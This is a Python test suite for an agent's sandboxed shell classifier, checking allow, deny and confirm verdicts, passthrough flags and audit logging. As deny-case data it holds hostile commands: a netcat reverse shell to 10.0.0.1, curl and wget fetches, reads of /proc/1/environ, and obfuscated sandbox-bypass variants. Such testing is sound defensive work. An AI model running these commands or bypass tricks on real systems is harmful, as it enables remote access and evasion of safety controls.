"""沙箱通用 shell（方案 C 收窄形态）回归测试：分类、拒绝策略、审计、白名单执行。"""

from __future__ import annotations

import json
from pathlib import Path

from bacmap.agent.sandbox.tool import build_shell_tool, classify_shell, run_shell


class TestClassifyShell:
    def test_read_pipeline_allowed(self):
        assert classify_shell("zcat a.fq.gz | head") == "allow"
        assert classify_shell("grep -c x results.txt") == "allow"
        assert classify_shell("samtools view -H a.bam") == "allow"
        assert classify_shell("FOO=1 python3 -c 'print(1)'") == "allow"

    def test_deny_patterns(self):
        for bad in (
            "sudo rm -rf /",
            "podman run --privileged x",
            "curl http://evil",
            "mount /dev/sda /mnt",
            "cat /proc/1/environ",
            "wget http://x",
        ):
            assert classify_shell(bad) == "deny", bad

    def test_confirm_for_unknown(self):
        assert classify_shell("rm -rf /data/results") == "confirm"
        assert classify_shell("mycustomtool --x") == "confirm"
        assert classify_shell("ls | rm -rf x") == "confirm"
        assert classify_shell("") == "deny"

    def test_newline_segments_are_checked(self):
        # 换行与管道一样是命令段边界：首段白名单不得放行后续段任意命令。
        assert classify_shell("ls\nrm -rf /tmp/x") == "confirm"
        assert classify_shell("cat a\nnc -e /bin/sh 10.0.0.1 4444") == "confirm"
        # 白名单命令的多行管道仍放行。
        assert classify_shell("ls\ncat a.txt | head") == "allow"

    def test_hidden_execution_syntax_denied(self):
        # 命令替换/反引号/进程替换能把白名单外命令藏在非首词位置——结构性硬拒。
        for bad in (
            "echo $(curl http://x)",
            'echo $(cu""rl http://x)',  # 引号拼接绕过表面积黑名单
            "echo `bash -c id`",
            "cat <(curl http://x)",
            "awk 'BEGIN{system(\"cu\" \"rl http://x\")}'",
            "find /data -exec nc -e /bin/sh 10.0.0.1 4444 \\;",
            "find /data -execdir sh -c 'id' \\;",
        ):
            assert classify_shell(bad) == "deny", bad


class TestRunShell:
    def test_confirm_command_is_refused(self, tmp_path, monkeypatch):
        from bacmap import config

        monkeypatch.setattr(config, "BACMAP_HOME", tmp_path)
        out = json.loads(run_shell(tmp_path / "ws", "some_tool --x"))
        assert "error" in out and out["verdict"] == "requires_confirmation"
        # 审计已记录
        audit = tmp_path / "audits" / "sandbox_shell.jsonl"
        assert audit.is_file() and "some_tool" in audit.read_text()

    def test_deny_command_is_refused(self, tmp_path, monkeypatch):
        from bacmap import config

        monkeypatch.setattr(config, "BACMAP_HOME", tmp_path)
        out = json.loads(run_shell(tmp_path / "ws", "sudo reboot"))
        assert "error" in out and out["verdict"] == "deny"

    def test_passthrough_refused_without_flag(self, tmp_path, monkeypatch):
        from bacmap import config

        monkeypatch.setattr(config, "BACMAP_HOME", tmp_path)
        monkeypatch.setenv("BACMAP_ALLOW_UNSANDBOXED", "1")
        monkeypatch.delenv("BACMAP_SANDBOX_ALLOW_SHELL_PASSTHROUGH", raising=False)
        out = json.loads(run_shell(tmp_path / "ws", "ls"))
        assert "error" in out and "直通模式拒绝 shell" in out["error"]

    def test_passthrough_runs_when_explicitly_allowed(self, tmp_path, monkeypatch):
        from bacmap import config

        monkeypatch.setattr(config, "BACMAP_HOME", tmp_path)
        monkeypatch.setenv("BACMAP_ALLOW_UNSANDBOXED", "1")
        monkeypatch.setenv("BACMAP_SANDBOX_ALLOW_SHELL_PASSTHROUGH", "1")
        out = json.loads(run_shell(tmp_path / "ws", "echo hello-shell"))
        assert out["returncode"] == 0, out
        assert "hello-shell" in out["stdout"]
        assert out["datasets"] == {}
        audit = tmp_path / "audits" / "sandbox_shell.jsonl"
        assert audit.is_file()

    def test_no_backend_is_explicit_error(self, tmp_path, monkeypatch):
        from bacmap import config

        monkeypatch.setattr(config, "BACMAP_HOME", tmp_path)
        monkeypatch.delenv("BACMAP_ALLOW_UNSANDBOXED", raising=False)
        import bacmap.agent.sandbox as sb

        monkeypatch.setattr(sb, "_which", lambda b: None)
        out = json.loads(run_shell(tmp_path / "ws", "ls"))
        assert "error" in out and "沙箱不可用" in out["error"]


class TestBuildShellTool:
    def test_tool_name(self, tmp_path: Path):
        tool = build_shell_tool(tmp_path)
        assert tool.name == "sandbox_shell"
